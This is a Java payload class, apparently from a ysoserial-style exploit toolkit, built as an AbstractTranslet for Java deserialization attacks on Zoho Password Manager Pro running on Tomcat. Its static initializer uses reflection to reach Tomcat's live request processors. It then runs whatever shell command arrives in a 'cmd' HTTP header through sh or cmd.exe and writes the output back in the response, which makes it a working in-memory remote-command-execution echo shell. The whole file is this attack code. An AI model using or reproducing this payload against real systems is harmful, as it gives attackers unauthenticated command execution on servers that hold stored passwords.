package ysoserial.payloads.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.ParallelWebappClassLoader;
import org.apache.coyote.*;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.Scanner;

public class ZohoPMPTomcatEcho extends AbstractTranslet {

    static {
        try {
            ParallelWebappClassLoader parallelWebappClassLoader = (ParallelWebappClassLoader) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) parallelWebappClassLoader.getResources().getContext();
            Field context = standardContext.getClass().getDeclaredField("context");
            context.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context.get(standardContext);
            Field service = applicationContext.getClass().getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService) service.get(applicationContext);
            Connector[] connectors = standardService.findConnectors();
            for (int i = 0; i < connectors.length; i++) {
                Connector connector = connectors[i];
                ProtocolHandler protocolHandler = connector.getProtocolHandler();
                Field handler = AbstractProtocol.class.getDeclaredField("handler");
                handler.setAccessible(true);
                Object o = handler.get(protocolHandler);
                Field global = o.getClass().getDeclaredField("global");
                global.setAccessible(true);
                o = global.get(o);
                Field processors = o.getClass().getDeclaredField("processors");
                processors.setAccessible(true);
                ArrayList processorsList = (ArrayList) processors.get(o);
                for (int j = 0; j < processorsList.size(); j++) {
                    Object o1 = processorsList.get(j);
                    Field req = o1.getClass().getDeclaredField("req");
                    req.setAccessible(true);
                    org.apache.coyote.Request request = (Request) req.get(o1);
                    Response response = request.getResponse();
                    response.addHeader("rce", "rce");
                    try {
                        String osTyp = System.getProperty("os.name");
                        String cmd = request.getHeader("cmd");
                        boolean isLinux = true;
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        response.doWrite(ByteBuffer.wrap(output.getBytes(Charset.forName("utf8"))));
                    } catch (Exception e) {
                        continue;
                    }
                }
            }
        } catch (Exception e) {
        }
    }


    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
